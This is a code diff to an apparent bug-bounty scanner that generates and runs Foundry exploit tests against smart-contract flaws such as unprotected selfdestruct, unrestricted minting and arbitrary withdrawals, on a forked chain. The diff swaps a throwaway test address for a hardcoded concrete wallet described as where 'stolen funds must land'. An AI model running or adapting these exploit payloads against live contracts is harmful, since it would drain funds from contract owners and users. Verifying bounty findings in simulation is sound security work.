@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import re
 import shutil
+import os
 import subprocess
 from dataclasses import dataclass
 from pathlib import Path
@@ -22,6 +23,18 @@ from pathlib import Path
 from .solidity import Function, SourceFile
 
 _FORGE_CANDIDATES = [shutil.which("forge"), str(Path.home() / ".foundry" / "bin" / "forge")]
+
+# The attacker / receiving wallet: the exploit routes stolen funds HERE and confirms they land.
+# "Funds moved to a wallet" is the theory of impact, so we check THIS wallet's balance delta.
+# Override per deployment with BOUNTYSCAN_ATTACKER_WALLET.
+ATTACKER_WALLET = os.environ.get("BOUNTYSCAN_ATTACKER_WALLET", "0xE4754d8237C9528FC23E81F9BB8F0aEE9B646bF8")
+
+
+def _addr_literal(addr: str) -> str:
+    """Embed an address as `address(uint160(0x..))` - a numeric literal, so Solidity's EIP-55 checksum
+    requirement never rejects the (lowercase, from-DB) address and the test always compiles."""
+    h = re.sub(r"[^0-9a-fA-F]", "", addr.lower().replace("0x", ""))
+    return f"address(uint160(0x{h}))"
 
 
 def forge_bin() -> str | None:
@@ -127,8 +140,8 @@ pragma solidity ^0.8.20;
 import {{Test, console2}} from "forge-std/Test.sol";
 contract ExploitPoC is Test {{
     address constant TARGET = {target};
-    address attacker = makeAddr("bountyscan_attacker");
-    function setUp() public {{ vm.deal(attacker, 10 ether); }}
+    address constant attacker = {attacker};   // receiving wallet - stolen funds must land here
+    function setUp() public {{ vm.deal(attacker, 10 ether); }}   // gas stipend; impact measured as a DELTA
     // balanceOf that never reverts: returns 0 if TARGET is not an ERC-20.
     function _tok(address who) internal view returns (uint256) {{
         (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
@@ -139,13 +152,13 @@ contract ExploitPoC is Test {{
 _FOOTER = "    }\n}\n"
 
 
-def build_exploit(finding, fn: Function, target: str) -> str | None:
+def build_exploit(finding, fn: Function, target: str, wallet: str = ATTACKER_WALLET) -> str | None:
     """Full Exploit.t.sol for an auto-verifiable finding, or None if it must be verified manually."""
     det = finding.detector
     if det not in AUTO_VERIFIABLE or fn is None or not _encodable(fn):
         return None
     sig = canonical_sig(fn)
-    body = _HEADER.format(target=target)
+    body = _HEADER.format(target=_addr_literal(target), attacker=_addr_literal(wallet))
     # prank with BOTH msg.sender and tx.origin = attacker, so a legitimate guard reverts the call.
     if det == "unprotected-selfdestruct":
         body += (
@@ -202,25 +215,26 @@ def parse_outcome(finding, stdout: str) -> PayloadVerdict:
     if not call_ok:
         return PayloadVerdict(finding, "reverted",
                               "an unprivileged attacker's call reverts - the access guard holds")
+    w = ATTACKER_WALLET
     if det == "unprotected-selfdestruct":
         if code < 0:
             return PayloadVerdict(finding, "confirmed", "selfdestruct destroyed the contract code", wei)
         if wei > 0:
-            return PayloadVerdict(finding, "confirmed", f"selfdestruct paid the attacker {wei} wei", wei)
+            return PayloadVerdict(finding, "confirmed", f"selfdestruct moved {wei} wei to the wallet {w}", wei)
         return PayloadVerdict(finding, "no_change", "call succeeds but code intact and no funds moved (post-Cancun / fallback)")
     if det in ("unrestricted-mint",):
-        return (PayloadVerdict(finding, "confirmed", f"attacker minted {tok} tokens to itself", tok) if tok > 0
-                else PayloadVerdict(finding, "no_change", "call succeeds but attacker balance unchanged"))
+        return (PayloadVerdict(finding, "confirmed", f"{tok} tokens freshly minted to the wallet {w}", tok) if tok > 0
+                else PayloadVerdict(finding, "no_change", "call succeeds but the wallet's balance is unchanged"))
     if det in ("arbitrary-recipient-withdrawal",):
         gain = max(wei, tok)
-        return (PayloadVerdict(finding, "confirmed", f"attacker received {gain} (wei/token)", gain) if gain > 0
-                else PayloadVerdict(finding, "no_change", "withdrawal call succeeds but attacker gained nothing"))
+        return (PayloadVerdict(finding, "confirmed", f"{gain} (wei/token) moved to the wallet {w}", gain) if gain > 0
+                else PayloadVerdict(finding, "no_change", "withdrawal call succeeds but the wallet gained nothing"))
     if det == "unrestricted-burn-from":
         # burning a third party's balance needs a funded victim -> can't prove with a generic payload
         return PayloadVerdict(finding, "manual", "burn-from needs a funded victim; verify by hand")
     # privileged-function: a non-reverting unauthorized call is suspicious but impact isn't proven generically
     if wei > 0 or tok > 0:
-        return PayloadVerdict(finding, "confirmed", f"unauthorized call succeeded and paid the attacker {max(wei, tok)}", max(wei, tok))
+        return PayloadVerdict(finding, "confirmed", f"unauthorized call moved {max(wei, tok)} to the wallet {w}", max(wei, tok))
     return PayloadVerdict(finding, "manual",
                           "unauthorized call does NOT revert - no funds moved generically; confirm the impact by hand")
 
@@ -236,7 +250,8 @@ def _function_of(files: list[SourceFile], finding) -> Function | None:
 
 
 def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: str | None,
-                 fork_block: int | None = None, timeout: int = 300, workdir: Path | None = None) -> list[PayloadVerdict]:
+                 fork_block: int | None = None, timeout: int = 300, workdir: Path | None = None,
+                 wallet: str = ATTACKER_WALLET) -> list[PayloadVerdict]:
     """Build + run one exploit per finding. Returns a verdict per finding (same order)."""
     forge = forge_bin()
     verdicts: list[PayloadVerdict] = []
@@ -252,7 +267,7 @@ def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: 
 
     for f in findings:
         fn = _function_of(files, f)
-        test = build_exploit(f, fn, target) if fn is not None else None
+        test = build_exploit(f, fn, target, wallet) if fn is not None else None
         if test is None:
             verdicts.append(PayloadVerdict(f, "manual", f"{f.detector}: no generic payload - verify by hand"))
             continue
